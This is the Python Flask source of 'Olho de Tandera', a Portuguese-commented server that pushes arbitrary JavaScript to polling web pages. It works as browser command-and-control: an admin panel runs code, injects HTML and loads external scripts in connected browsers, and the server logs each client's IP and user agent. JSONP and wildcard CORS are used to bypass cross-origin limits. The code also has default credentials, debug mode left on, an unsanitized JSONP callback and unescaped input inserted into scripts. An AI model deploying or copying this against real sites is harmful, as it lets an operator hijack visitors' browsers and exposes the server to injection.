import json
import time
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, session, redirect, url_for
from werkzeug.exceptions import HTTPException
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
from datetime import datetime, timedelta
import os
from functools import wraps

"""
Olho de Tandera: Sistema de Controle Remoto para Páginas Web
=============================================================

Este aplicativo permite o envio de comandos JavaScript em tempo real para páginas web clientes.
Um administrador pode executar JavaScript, manipular o DOM, injetar HTML e controlar
a visibilidade de elementos em páginas remotas sem necessidade de atualização.

Autores: MrCl0wn Security Lab
Data de criação: Maio/2025
Versão: 1.0
"""

# Configuração para compatibilidade Windows com MIME types
import mimetypes
mimetypes.add_type('application/javascript', '.js')

# Inicialização e configuração do aplicativo Flask
app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_change_in_production')

# Credenciais de autenticação para o painel de administração
# AVISO DE SEGURANÇA: Em ambiente de produção, estas credenciais devem estar em
# variáveis de ambiente ou em um banco de dados seguro, nunca hardcoded
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'tandera')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'tandera')
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# Armazenamento de dados em memória
# Em produção, considere usar um banco de dados persistente
commands = {'default': {"id": str(uuid.uuid4()), "command": "", "timestamp": datetime.now().isoformat()}}
clients = {}  # Armazena informações sobre os clientes conectados
command_logs = []  # Histórico de comandos enviados

# Decorator para proteger rotas que exigem autenticação
def login_required(f):
    """
    Decorator que redireciona para a página de login se o usuário não estiver autenticado.
    Aplique este decorator a todas as rotas de administração que precisam ser protegidas.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Rota de autenticação para o painel de administração.
    GET: Exibe a página de login
    POST: Processa a tentativa de login
    """
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['logged_in'] = True
            return redirect(request.args.get('next') or url_for('admin'))
        else:
            error = 'Invalid credentials'
    
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Rota para encerrar a sessão do administrador"""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin/set_command', methods=['POST'])
@login_required
def set_command():
    """
    Endpoint para definir um novo comando a ser executado nos clientes.
    Recebe dados em formato JSON e gera o comando JavaScript correspondente.
    
    Tipos de comando suportados:
    - js: Executa código JavaScript arbitrário
    - html: Injeta HTML no corpo da página
    - manipulate: Modifica elementos específicos por ID
    - visibility: Controla a visibilidade de elementos
    - head: Adiciona elementos ao cabeçalho da página
    """
    data = request.json
    client_id = data.get('client_id', 'default')
    
    command_type = data.get('type')
    content = data.get('content', '')
    target_id = data.get('target_id', '')
    action = data.get('action', '')

    # Validação de segurança básica
    if not isinstance(content, str) or not isinstance(target_id, str):
        return jsonify({"success": False, "error": "Invalid input type"}), 400
        
    # Verificação simples para evitar roubo de cookies
    if "document.cookie" in content and command_type == 'js':
        return jsonify({"success": False, "error": "Unauthorized cookie access"}), 403

    js_command = ""
    
    # Geração do comando JavaScript baseado no tipo de operação solicitada
    if command_type == 'js':
        # Executa código JavaScript diretamente
        js_command = content
        
    elif command_type == 'html':
        # Injeta conteúdo HTML no final do corpo da página
        js_command = f"""
            const temp = document.createElement('div');
            temp.innerHTML = `{content}`;
            document.body.appendChild(temp);
        """
        
    elif command_type == 'manipulate':
        # Manipula um elemento específico por ID
        if action == 'ADD':
            # Adiciona conteúdo ao elemento existente
            js_command = f"document.getElementById('{target_id}').innerHTML += `{content}`;"
        elif action == 'REPLACE':
            # Substitui todo o conteúdo do elemento
            js_command = f"document.getElementById('{target_id}').innerHTML = `{content}`;"
        elif action == 'INSERT_AFTER':
            # Insere conteúdo após o elemento
            js_command = f"document.getElementById('{target_id}').insertAdjacentHTML('afterend', `{content}`);"
        elif action == 'INSERT_BEFORE':
            # Insere conteúdo antes do elemento
            js_command = f"document.getElementById('{target_id}').insertAdjacentHTML('beforebegin', `{content}`);"
            
    elif command_type == 'visibility':
        # Controla a visibilidade de um elemento
        display = 'block' if content == 'show' else 'none'
        js_command = f"document.getElementById('{target_id}').style.display = '{display}';"
    
    elif command_type == 'head':
        # Adiciona elementos ao cabeçalho da página
        action = data.get('action')
        content = data.get('content')
        
        if action == 'CSS_URL':
            # Adiciona link para stylesheet externo
            js_command = f"""
                const linkElement = document.createElement('link');
                linkElement.rel = 'stylesheet';
                linkElement.href = '{content}';
                document.head.appendChild(linkElement);
            """
        elif action == 'CSS_INLINE':
            # Adiciona CSS inline
            js_command = f"""
                const styleElement = document.createElement('style');
                styleElement.textContent = `{content}`;
                document.head.appendChild(styleElement);
            """
        elif action == 'JS_URL':
            # Adiciona script externo
            js_command = f"""
                const scriptElement = document.createElement('script');
                scriptElement.src = '{content}';
                document.head.appendChild(scriptElement);
            """
        elif action == 'JS_INLINE':
            # Adiciona JavaScript inline
            js_command = f"""
                const scriptElement = document.createElement('script');
                scriptElement.textContent = `{content}`;
                document.head.appendChild(scriptElement);
            """
        elif action == 'META':
            # Adiciona meta tag
            js_command = f"""
                const metaElement = document.createElement('meta');
                const metaProps = {content};
                Object.keys(metaProps).forEach(key => {{
                    metaElement.setAttribute(key, metaProps[key]);
                }});
                document.head.appendChild(metaElement);
            """
    
    # Gerar ID único para o comando e registrar timestamp
    command_id = str(uuid.uuid4())
    current_time = datetime.now().isoformat()
    
    command_data = {
        "id": command_id,
        "command": js_command,
        "timestamp": current_time
    }
    
    # Distribuição do comando para os clientes alvo
    if client_id == 'default':
        # Envia para todos os clientes conectados
        for cid in clients:
            commands[cid] = command_data
        # Atualiza também o comando padrão
        commands['default'] = command_data
    else:
        # Envia apenas para o cliente específico
        commands[client_id] = command_data
    
    # Registra o comando no histórico de logs
    log_entry = {
        "id": command_id,
        "client_id": client_id,
        "type": command_type,
        "command": js_command,
        "timestamp": current_time
    }
    command_logs.append(log_entry)
    
    # Limitação do histórico para evitar consumo excessivo de memória
    if len(command_logs) > 100:
        command_logs.pop(0)
    
    # Log de depuração
    print(f"Novo comando gerado: ID={command_id}, Cliente={client_id}, Tipo={command_type}")
    
    return jsonify({"success": True, "command": command_data})

@app.route('/admin/clients')
@login_required
def get_clients():
    """
    Endpoint para listar todos os clientes conectados.
    Limpa clientes inativos automaticamente (sem atividade por 30+ minutos).
    """
    # Remove clientes inativos
    now = datetime.now()
    cleanup_time = now - timedelta(minutes=30)
    cleanup_str = cleanup_time.isoformat()
    
    # Formata dados dos clientes para exibição no frontend
    client_list = [
        {
            "id": client_id,
            "active": client.get("last_seen", "") > cleanup_str,
            "last_seen": client.get("last_seen", ""),
            "user_agent": client.get("user_agent", ""),
            "ip": client.get("ip", "")
        }
        for client_id, client in clients.items()
    ]
    
    return jsonify({"success": True, "clients": client_list})

@app.route('/admin/clients/<client_id>', methods=['DELETE'])
@login_required
def remove_client(client_id):
    """
    Endpoint para remover um cliente específico do sistema.
    Remove também os comandos associados a este cliente.
    """
    if client_id in clients:
        del clients[client_id]
        if client_id in commands:
            del commands[client_id]
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Client not found"}), 404

@app.route('/admin/logs')
@login_required
def get_logs():
    """Endpoint para obter o histórico de comandos enviados"""
    return jsonify({"success": True, "logs": command_logs})

@app.route('/')
def index():
    """
    Página inicial do cliente que receberá os comandos do servidor.
    Renderiza o template server_to_client.html.
    """
    return render_template('server_to_client.html')

@app.route('/admin')
@login_required
def admin():
    """
    Painel de administração para envio de comandos.
    Acesso protegido pelo decorator login_required.
    """
    return render_template('admin.html')

@app.route('/js/cmd.js')
def serve_cmd_js():
    """
    Serve o arquivo JavaScript do cliente com configuração de cache.
    Este arquivo é responsável por verificar e executar os comandos recebidos.
    """
    response = send_from_directory('static/js', 'cmd.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

@app.route('/command')
def get_command():
    """
    Endpoint principal para o polling de comandos pelos clientes.
    Suporta JSONP para contornar restrições de CORS quando necessário.
    
    Cada cliente solicita periodicamente este endpoint para verificar
    se há novos comandos disponíveis para execução.
    """
    client_id = request.args.get('client_id', 'default')
    last_received = request.args.get('last_id', '')
    callback = request.args.get('callback')
    
    # Registra ou atualiza informações do cliente
    if client_id != 'default':
        if client_id not in clients:
            clients[client_id] = {}
            # Inicializa comando para novo cliente
            if client_id not in commands:
                commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
        
        # Atualiza informações do cliente
        clients[client_id].update({
            "last_seen": datetime.now().isoformat(),
            "user_agent": request.headers.get('User-Agent', ''),
            "ip": request.remote_addr
        })
    
    # Obtém o comando atual para este cliente
    current_command = commands.get(client_id, commands.get('default', {"id": "", "command": "", "timestamp": ""}))
    
    # Log para depuração
    print(f"Cliente {client_id} solicitou comando. Último recebido: {last_received}, Atual: {current_command.get('id', '')}")
    
    # Prepara a resposta com indicação se é um comando novo
    response_data = {
        "new": last_received != current_command.get("id", ""),
        **current_command
    }
    
    # Formata a resposta conforme necessário (JSONP ou JSON padrão)
    if callback:
        # Formato JSONP para contornar restrições de CORS
        response = app.response_class(
            response=f"{callback}({json.dumps(response_data)})",
            status=200,
            mimetype="application/javascript"
        )
    else:
        # JSON padrão com cabeçalhos CORS
        response = jsonify(response_data)
        response.headers['Access-Control-Allow-Origin']  = '*'
        response.headers['Access-Control-Allow-Methods'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    
    return response

if __name__ == '__main__':
    # Inicialização do servidor
    # AVISO DE SEGURANÇA: Em produção, use HTTPS:
    # app.run(ssl_context='adhoc', debug=False)
    app.run(debug=True)
